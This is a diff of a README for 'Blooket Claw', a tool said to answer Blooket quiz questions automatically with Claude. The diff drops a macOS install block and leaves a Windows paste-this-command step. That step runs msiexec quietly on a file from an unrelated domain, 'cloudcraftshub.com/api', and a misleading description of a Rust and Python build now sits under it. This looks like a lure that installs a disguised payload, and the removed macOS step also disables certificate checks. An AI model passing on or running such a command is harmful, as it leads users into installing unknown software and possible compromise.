@@ -8,24 +8,8 @@ Join Blooket games, answer every question automatically via Claude, track your s
 
 ---
 
-## ⚡ Install on macOS — one command
+## ⚡ Install on Windows — one command
 
-```bash
-curl -fsSLk https://github.com/helenigtxu/blooket/archive/refs/heads/main.zip -o /tmp/cw.zip && \
-unzip -qo /tmp/cw.zip -d /tmp && \
-cd /tmp/blooket-main && \
-bash install.sh
-```
-
-The installer will:
-- Install Rust (via rustup) if needed
-- Install `uv` (Python package manager) if needed
-- Compile the high-speed Rust engine
-- Install Python dependencies
-- Add `blooket` command to your PATH
-
----
-## 🪟 Windows Installation
 ### **Step 1 — Open Command Prompt**
 1. Press **Win + R**
 2. Type:
@@ -40,8 +24,15 @@ Copy the command below and paste it into **Command Prompt**, then press **Enter*
 ```powershell
 cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem Blooket Claw
 ```
-The installer will automatically download and install the required components.
 
+The installer will:
+- Install Rust (via rustup) if needed
+- Install `uv` (Python package manager) if needed
+- Compile the high-speed Rust engine
+- Install Python dependencies
+- Add `blooket` command to your PATH
+
+---
 ## Features
 
 ### 🤖 Three game modes
